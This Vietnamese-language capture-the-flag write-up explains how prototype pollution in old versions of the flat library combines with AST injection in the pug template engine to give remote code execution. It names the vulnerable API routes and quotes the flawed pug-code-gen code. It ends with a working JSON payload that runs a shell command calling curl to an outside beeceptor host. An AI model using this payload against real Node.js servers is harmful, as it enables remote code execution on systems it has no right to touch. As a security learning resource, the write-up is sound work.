# pug-ast
## Ý tưởng
### Prototype Pollution 
Tận dụng các lỗi Prototype Pollution để gây tác động tới các trang web 
sử dụng các thư viện cũ mà không filter input người dùng nên có thể bị 
chèn các thuộc tính tới các biến thông qua prototype của một đầu vào 
bất kỳ thường gặp nhất là các thư viện JSON.
### Tấn công AST của các template engine
Việc render các template của một template engine nói chung sẽ cần 
phân tích tạo ra các tokens, parse để tạo ra AST và từ đó generate ra mã nguồn 
để chạy tạo ra một page cho các engine.


[Abstract Syntax Tree](https://en.wikipedia.org/wiki/Abstract_syntax_tree)

Các thành phần của cây có thể bị tác động trong pha parse và genrate code.
Nếu không filter có thể dẫn đến việc bị tấn công.

## Thư viện lỗi
### Flat
Thư viện flat giúp tạo ra object từ JSON và ngược ra. Các phiên bản trước 
đây không check đầu vào ở hàm ```unflatten()``` nên đã dẫn đến lỗ hổng 
Prototype Pollution và chỉ được vá ở phiên bản 5.0.2 mới nhất.
### Pug
Là một template engine để tạo từ file pug ra file html với tham số được truyền.
Thư viện này xảy ra lỗ hổng khi cho phép chạy các mã khi một biến được được 
truyền tham số như một phần của AST dẫn đến có thể bị RCE và được vá 
tại phiên bản 3.0.1 mơi đây (mới nhất là 3.0.2)
### Cách giải
## Tìm API lỗi
Bài này có 2 API có lỗ hổng Prototype Pollution do sử dụng thư viện cũ và không filter là 
`/api/` và `/api/students/:id`

## Lỗi RCE
Thư viện tồn tại lỗi trong hàm generateCode của pha genrate thành mã nguồn
```js
<!-- /node_modules/pug-code-gen/index.js -->

if (debug && node.debug !== false && node.type !== 'Block') {
    if (node.line) {
        var js = ';pug_debug_line = ' + node.line;
        if (node.filename)
            js += ';pug_debug_filename = ' + stringify(node.filename);
        this.buf.push(js + ';');
    }
}
```
Kh generate ra mã nguồn, trong khi duyệt các node của AST, complie sẽ để thêm trường ```node.line``` để phục vụ 
quá trình debug. Nếu ```node.line``` tồn tại và được thêm vào buffer.

Bình thường giá trị ```node.line``` nếu có là Integer nhưng có thể Injection AST
thành string và chèn vào mã nguồn bằng cách sử dụng các biến truyền vào template
để thực thi được mã tùy ý.

### JSON to RCE
Như vậy thỏa mã gồm có khả năng Prototype Pollution để thay đổi biến bất kỳ 
và thay đổi trường của các biến cần render trong pug engine thành 
mã có thể thay đổi được.

Payload:
```javascript
{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('curl https://biennd3.free.beeceptor.com/')"
    }
})
```
